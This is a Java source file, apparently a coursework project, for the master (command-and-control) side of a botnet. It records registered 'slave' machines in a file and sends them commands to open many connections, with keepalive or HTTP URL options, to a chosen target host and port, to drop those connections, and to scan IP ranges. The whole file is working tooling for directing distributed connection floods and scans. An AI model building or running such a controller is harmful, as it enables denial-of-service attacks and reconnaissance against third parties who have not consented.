

import java.net.*;
import java.io.*;
import java.lang.*;

class Listener implements Runnable 
{ //Class to connect to target using Multithreading
	
    private int listenerPort;
    private Thread th;
    private String threadName = "ListenMaster";
    
    Listener(int Port) 
    {
        listenerPort = Port;
        threadName = "ListenMaster";
    }

    public void run()
    {
        try(ServerSocket masterSock = new ServerSocket(listenerPort);) 
        {
        	//creates a socket where master listens for incoming connection request from slave
            while(true) 
            {
                try(Socket slave = masterSock.accept(); //create another new socket for slave to render services for slave
                		BufferedReader  in = new BufferedReader(new InputStreamReader(slave.getInputStream())); //read data from slave
                		FileWriter fw = new FileWriter("SlaveInfo.txt",true);)
                {  
	                	//open file to store slave details
	
	                    String line;
	                    while((line = in.readLine()) != null ) 
	                    {                                
	                        String[] split = line.split("\\s+");
	                        fw.write(line);    //write line at the end of the file
	                        fw.write(" \n");
	                        fw.close();
	                    }
	                    slave.close(); //job done for this slave, close socket
                }
                catch(IOException ex)
                {
	                    System.err.println("Run-while: " + ex.getMessage());
	                    System.exit(-1);
                }
            }
        }
        catch(IOException ex) 
        {
            System.err.println("Run: " + ex.getMessage());
            System.exit(-1);
        }
    }

    public void start() 
    {
        if( th == null) 
        {
            th = new Thread(this,threadName);
            th.start();
        }
    }
}

public class MasterBot 
{
    private static void SlavesInfo()
    { 
        File slavesFile = new File("SlaveInfo.txt"); 
        
        if(!slavesFile.exists()) 
        {
            System.out.println("Still No Slaves have been registered!");
            return;
        }

		        try (BufferedReader br = new BufferedReader(new FileReader("SlaveInfo.txt")))
		        {
		            String line; 
		            System.out.println("SlaveHostName        	   IPAddress    	 SourcePortNumber     RegistrationDate");
		            
			            while ((line = br.readLine()) != null)
				            {
						       		String[] details = line.split("\\s+");   // \\s+ means white space is used to split 
						       		System.out.println(details[0] + "            " + details[1] + "          " + details[2] + "                " +details[3]);
				            }
			            
		            br.close();
		        }
			catch(IOException ex) 
		        {
		            System.err.println("SlavesInfo: " + ex.getMessage());
		        }
    }

    private static void connect(String slaveIP, String targetHost, String targetPort, String NoOfConnections,String feature3)
    {
    	//System.out.println("in master connect loop"+"no of connect"+NoOfConnections);-to debug
    	
    	try(BufferedReader br = new BufferedReader(new FileReader("SlaveInfo.txt"));) 
    	{ 
    		
            String line;
            while ((line = br.readLine()) != null) 
            {
                String[] slaveDetails = line.split("\\s+");
                
                if ((slaveDetails[1].equals(slaveIP)) || (slaveDetails[0].equals(slaveIP)) || "all".equals(slaveIP)) 
                {
                    int slavePort = Integer.parseInt(slaveDetails[2]);
	                    try 
		                    {
		                        Socket slave = new Socket(slaveDetails[1], slavePort);
		                        PrintWriter pw = new PrintWriter(slave.getOutputStream(),true);
		                        pw.println("connect " + targetHost + " " + targetPort  + " " + NoOfConnections + " " + feature3); //Sending command to slave
		                        
		                        //System.out.println("sending infor to slave"+"connect " + targetHost + " " + targetPort  + " " + NoOfConnections + " " + feature3);-to debug
		                    }
	                    catch(IOException ex) 
		                    {
		                        System.out.println(ex.getMessage());
		                    }
                }
            }
            
            br.close();
        }
        catch(IOException ex) 
    	{
              System.err.println("connect: " + ex.getMessage());
        }
    }

    private static void disconnect(String slaveIP, String targetHost, String targetPort) 
    {
    	try(BufferedReader br = new BufferedReader(new FileReader("SlaveInfo.txt"));) 
    	{
            String line;
            while ((line = br.readLine()) != null) 
            {
                String[] slaveDetails = line.split("\\s+");
                
                if ( ( slaveDetails[1].equals(slaveIP) ) || ( slaveDetails[0].equals(slaveIP) ) || "all".equals(slaveIP) ) 
	                {
	                    int slavePort = Integer.parseInt(slaveDetails[2]);
	                    try 
		                    {
		                        Socket slaveSock = new Socket(slaveDetails[1], slavePort); //creating socket with slave to send the disconnect command
		                        PrintWriter pout = new PrintWriter(slaveSock.getOutputStream(),true); //creating output stream to write to slave
		                        pout.println("disconnect " + targetHost + " " + targetPort ); //sending command to slave
		                    }
	                    catch(IOException ex) 
		                    {
		                        System.out.println(ex.getMessage());
		                    }
	                }
            }
            
            br.close();
        }
        catch(IOException ex) 
    	{
            System.err.println("disconnect " + ex.getMessage());
        }
    }
 /*private static void ipscan(String argument)
 {

	    Socket slave = new Socket(slaveDetails[1], slavePort); 
 }*/
    private static void ipscan(String slaveIP,String IpRange)
    {
    	System.out.println("in ipscan master"+"slaveip: "+slaveIP+IpRange);
    	try(BufferedReader br = new BufferedReader(new FileReader("SlaveInfo.txt"));) 
    	{
            String line;
            while ((line = br.readLine()) != null) 
            {
                String[] slaveDetails = line.split("\\s+");
                
                if ( ( slaveDetails[1].equals(slaveIP) ) || ( slaveDetails[0].equals(slaveIP) ) || "all".equals(slaveIP))
                		{
	                    int slavePort = Integer.parseInt(slaveDetails[2]);
	                    try 
		                    {
		                        Socket slaveSock = new Socket(slaveDetails[1], slavePort); //creating socket with slave to send the ipscan command
		                        PrintWriter pout = new PrintWriter(slaveSock.getOutputStream(),true); //creating output stream to write to slave
		                        pout.println("ipscan " +slaveIP + " " + IpRange ); //sending command to slave
		                    }
	                    catch(IOException ex) 
		                    {
		                        System.out.println(ex.getMessage());
		                    }
	                }
            }
            
            br.close();
        }
        catch(IOException ex) 
    	{
            System.err.println("ipscan" + ex.getMessage());
        }
    	
        }
    public static void main(String[] args) 
    {
        if(args.length != 2 ) 
	        {
	            System.out.println("Port missing!");
	            System.exit(-1);
	        }
        if( !("-p".equals(args[0])) ) 
	        {
	            System.out.println("Port missing!");
	            System.exit(-1);
	        }

        File oldSlaveList = new File("SlaveInfo.txt");
        oldSlaveList.delete();                   //Deleting SlaveInfo.txt before starting new registration

        int Port = Integer.parseInt(args[1]);
        Listener listen = new Listener(Port);
        listen.start();

        while (true)
        {
            try 
            {
                BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
                String cmdStr;
                String numberOfConnections = "1";   //Default number of NoOfConnections set to 1
                String TargetPortNo ="all";  //default target port number is set to all for disconnect command
              		
                System.out.printf(">");
                cmdStr = br.readLine();
                args = cmdStr.split("\\s+");
 
                if("list".equals(args[0])) 
	                {
	                    SlavesInfo();
	                }
 
                if("connect".equals(args[0])) 
                {
                	
                	 
                    if(args.length >= 4) 
	                    {
                    	
                    	
                    	if(args.length==4)
	                    	{
	                    		connect(args[1],args[2],args[3],numberOfConnections,"NO"); //sending no as keepalive option is not specified
	                    	}
                    	else if(args.length==5) 
	                    	{
	                    		if("keepalive".equals(args[4]))
		                    		{
		                    			connect(args[1],args[2],args[3],numberOfConnections,"YES"); //sending yes as keepalive option is enabled
		                    		}
	                    		else if(args[4].contains("url="))
		                    		{
		                    			String url = args[4].replace("url=","");
		                                connect(args[1],args[2],args[3],numberOfConnections,url); //sending url for http connection
		                    		}
	                    		else
		                    		{
		                    			numberOfConnections=args[4];
		                    			connect(args[1],args[2],args[3],numberOfConnections,"NO"); //here number of connections is specified	
		                    		}
	                    	}
                    	else if(args.length==6)
	                    	{
                    			//debug System.out.println("in length 6 masterbot loop");
                    		
	                    		if("keepalive".equals(args[5]))
		                    		{
		                    			numberOfConnections=args[4];
		                    			connect(args[1],args[2],args[3],numberOfConnections,"YES"); //sending number of connections and keep alive option is enabled
		                    		}
	                    		else
		                    		{	if(args[5].contains ("url="))
				                    		{
		                    					//debug System.out.println("in url loop");
		                    					
			                    				numberOfConnections=args[4];
			                    				String url = args[5].replace("url=","");
			                                    connect(args[1],args[2],args[3],numberOfConnections,url); //sending numberof connections and url
			                                    
			                                    //System.out.println("no of connections"+numberOfConnections);-to debug
				                    		}
		                    			
		                    		}
	                    	}
	                    }
                    else
                        System.out.println("Parameters Missing!");
                }

                if("disconnect".equals(args[0])) 
                {
                	if(args.length>=3)
	                	{
		                    if(args.length == 4)
		                    	TargetPortNo = args[3];
		                    	
		                        disconnect(args[1], args[2],TargetPortNo);
		                }
                    else
                        System.out.println("Parameters Missing!");
                }
                
               if("ipscan".equals(args[0]))
                {
                	ipscan(args[1],args[2]);
                }
            }
            catch(IOException ex)
            { 
                System.err.println("Main: " + ex.getMessage());
                System.exit(-1);
            }
        }
    }
}
